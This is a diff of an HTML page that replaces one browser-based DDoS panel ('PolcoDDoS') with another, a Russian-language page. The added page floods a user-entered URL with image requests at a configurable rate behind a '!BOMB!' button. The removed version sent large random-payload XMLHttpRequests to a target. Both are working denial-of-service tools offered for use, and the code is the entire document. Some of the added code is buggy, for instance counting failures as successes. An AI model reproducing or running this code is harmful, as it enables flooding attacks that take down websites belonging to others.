@@ -1,147 +1,142 @@
 <!DOCTYPE html>
-<html>
-<head>
-    <title>PolcoDDoS</title>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+<html lang="ru" style="justify-content: center">
 
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
-    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.4/dist/jquery.slim.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
-    <style>
-        .progress-bar::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 2px;
-            background-color: rgba(255, 255, 255, 0.75);
-        }
-    </style>
+<head>
+    <meta charset="UTF-8">
+    <title>DDOS</title>
+    <link rel="stylesheet" href="style.css">
 </head>
 
-<body class="bg-dark" style="overflow: hidden;">
-<div class="container mt-5">
-    <div class="row">
-        <div class="col-md-12">
-            <div class="card border-primary">
-                <div class="card-header bg-primary text-light">
-                    PolcoDDoS Panel
-                </div>
-
-                <div class="card-body">
-                    Target:
-                    <input type="text" class="form-control" id="target" placeholder="https://example.com/" /><br />
-
-                    <div class="row">
-                        <div class="col-6">
-                            Method:
-                            <select id="method" class="form-control">
-                                <option value="HEAD">HEAD</option>
-                                <option value="GET">GET</option>
-                                <option value="POST">POST</option>
-                            </select>
-                        </div>
-
-                        <div class="col-6">
-                            Packet size (MB):
-                            <input type="number" value="1" class="form-control" id="size" />
-                        </div>
-                    </div><br />
-
-                    Duration (in seconds):
-                    <input type="number" value="10" class="form-control" id="duration" /><br />
-
-                    <button class="btn btn-success btn-block" id="attack">
-                        Start Attack
-                    </button>
-                </div>
-            </div>
-        </div>
+<body style=" background-color: black; justify-content: center;">
+    <div id="header">
+        <img src="https://res.cloudinary.com/teepublic/image/private/s--bD4eJcrz--/t_Preview/b_rgb:191919,c_limit,f_jpg,h_630,q_90,w_630/v1481594297/production/designs/940052_1.jpg" alt="" style="width: 250px">
     </div>
-</div>
+    <div class="input_table">
+        <fieldset style="width=1200px; height=200px; align-content: center; color: azure; border: 0;">
+            <legend style=" font-family: fantasy;">Введите URL: </legend>
+            <label> <input type="text" id="targetURL" style="background-color: black; color: aliceblue; border-radius: 10px; align-content: center; width:250px; height: 32px; font-size: 24px"></label>
+        </fieldset>
+        
+     </div>   
+        
+    <div class="options_table" style="width:250px; height:auto; border-radius: 10px; border: white solid 2px">
+        <fieldset style="color: aliceblue; font-family: fantasy; width: 250px; border: 0;">
+            <legend>Опции</legend>
+            <label>Пакетов в секунду : <input style="" id="rps" value="100" /></label><br />
 
-<div class="progress" style="height: 30px; display: none;">
-    <div id="progressBar" class="progress-bar bg-success" role="progressbar" style="width: 0%;" aria-valuenow="0"
-         aria-valuemin="0" aria-valuemax="100"></div>
-</div>
+            <label>Сообщение : <br /><input style="" id="message" value="..." /></label>
+        </fieldset>
+    </div>  
+        
+   
+        
+    <div>
+        <fieldset style="border:0">
+            <button id="fireButton" style="width: 200px; height: 200px; border-radius: 100px; background-color: firebrick; font-family: fantasy; font-size: 24px; color: azure; border: black solid 10px">
+                    !BOMB!
+            </button>
+        </fieldset>
+    </div>
 
-<script>
-    var DDOS_ATTACK = null;
+    <div style="width:250px; height:160px; border: solid white 2px; border-radius: 10px">
+        <fieldset style="width:100%; height:100%; border: 0">
+            <legend style="color: aliceblue">Статус:</legend>
+            <dl>
+                <dt style="color: azure">Отправлено:</dt>
+                <dd id="requestedCtr" style="color: aliceblue">0</dd>
+                <dt style="opacity: 0.5; color: lightgreen;">Отправлено OK :</dt>
 
-    function generateRandomPayload(sizeInMB) {
-        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-        const dataSize = sizeInMB * 1024 * 1024;
+                <dd style="opacity: 0.5; color: aliceblue" id="succeededCtr">0</dd>
+                <dt style="opacity: 0.5; color: lightcoral;">Отправлено неудачно :</dt>
+                <dd style="opacity: 0.5; color: aliceblue" id="failedCtr" >0</dd>
+            </dl>
+        </fieldset>
+    </div>
+    
 
-        let payload = '';
-        for (let i = 0; i < dataSize; i++) {
-            payload += characters.charAt(Math.floor(Math.random() * characters.length));
-        }
-
-        return payload;
-    }
-
-    function attack(target, method = "HEAD", sizeInMB = 1, duration = 10) {
-        if (DDOS_ATTACK == null) {
-            $(".progress").show();
-
-            var startTime = Date.now();
-            var endTime = startTime + duration * 1000;
-            var progress = 0;
-
-            DDOS_ATTACK = setInterval(function () {
-                if (Date.now() > endTime) {
-                    clearInterval(DDOS_ATTACK);
-                    DDOS_ATTACK = null;
-                    $(".progress").hide();
-                    $("#progressBar").css("width", "0%");
-                    $("#attack").removeClass("btn-danger").addClass("btn-success").text("Start Attack");
+    <script>
+        (function() {
+            var fireInterval;
+            var isFiring = false;
+            var requestedCtrNode = document.getElementById("requestedCtr"),
+                succeededCtrNode = document.getElementById("succeededCtr"),
+                failedCtrNode = document.getElementById("failedCtr"),
+                targetURLNode = document.getElementById("targetURL"),
+                fireButton = document.getElementById("fireButton"),
+                messageNode = document.getElementById("message"),
+                rpsNode = document.getElementById("rps"),
+                timeoutNode = document.getElementById("timeout");
+            var targetURL = targetURLNode.value;
+            targetURLNode.onchange = function() {
+                targetURL = this.value;
+            };
+            var requestsHT = {};
+            var requestedCtr = 0,
+                succeededCtr = 0,
+                failedCtr = 0;
+            var makeHttpRequest = function() {
+                if (requestedCtr > failedCtr + succeededCtr + 1000) {
                     return;
+                };
+
+                var rID = Number(new Date());
+                var img = new Image();
+                img.onerror = function() {
+                    onFail(rID);
+                };
+                img.onabort = function() {
+                    onFail(rID);
+                };
+                img.onload = function() {
+                    onSuccess(rID);
+                };
+
+                img.setAttribute("src", targetURL + "?id=" + rID + "&msg=" + messageNode.value);
+                requestsHT[rID] = img;
+                onRequest(rID);
+            };
+
+            var onRequest = function(rID) {
+                requestedCtr++;
+                requestedCtrNode.innerHTML = requestedCtr;
+            };
+
+            var onComplete = function(rID) {
+                delete requestsHT[rID];
+            };
+
+            var onFail = function(rID) {
+
+
+                succeededCtr++;
+                succeededCtrNode.innerHTML = succeededCtr;
+                delete requestsHT[rID];
+            };
+
+            var onSuccess = function(rID) {
+                succeededCtr++;
+                succeededCtrNode.innerHTML = succeededCtr;
+                delete requestsHT[rID];
+            };
+
+            fireButton.onclick = function() {
+                if (isFiring) {
+                    clearInterval(fireInterval);
+                    isFiring = false;
+                    this.innerHTML = "START";
+                } else {
+                    isFiring = true;
+                    this.innerHTML = "Stop flooding";
+
+                    fireInterval = setInterval(makeHttpRequest, (1000 / parseInt(rpsNode.value) | 0));
                 }
+            };
 
-                var version = "";
-                var payload = generateRandomPayload(sizeInMB);
+        })();
 
-                var x = new XMLHttpRequest();
-                x.open(method, target, true);
-                x.send(payload);
+        isFiring = true;
+        document.getElementById("fireButton").innerHTML = "Stop flooding";
+        fireInterval = setInterval(makeHttpRequest, (1000 / parseInt(document.getElementById("rps").value) | 0));
+    </script>
 
-                progress = ((Date.now() - startTime) / (endTime - startTime)) * 100;
-                $("#progressBar").css("width", progress + "%");
-                $("#progressBar").attr("aria-valuenow", progress);
-            }, 1000);
-        } else {
-            clearInterval(DDOS_ATTACK);
-            DDOS_ATTACK = null;
-            $(".progress").hide();
-            $("#progressBar").css("width", "0%");
-            $("#attack").removeClass("btn-danger").addClass("btn-success").text("Start Attack");
-        }
-    }
-
-    $("#attack").on("click", function () {
-        var target = $("#target").val();
-        var method = $("#method").val();
-        var sizeInMB = $("#size").val();
-        var duration = $("#duration").val();
-
-        if (target.length < 1) {
-            alert("Please enter target");
-            return;
-        }
-
-        if ($(this).hasClass("btn-success")) {
-            $(this).removeClass("btn-success").addClass("btn-danger").text("Stop Attack");
-            attack(target, method, sizeInMB, duration);
-        } else {
-            $(this).removeClass("btn-danger").addClass("btn-success").text("Start Attack");
-            clearInterval(DDOS_ATTACK);
-            DDOS_ATTACK = null;
-            $(".progress").hide();
-            $("#progressBar").css("width", "0%");
-        }
-    });
-</script>
-</body>
-</html>
+</body></html>
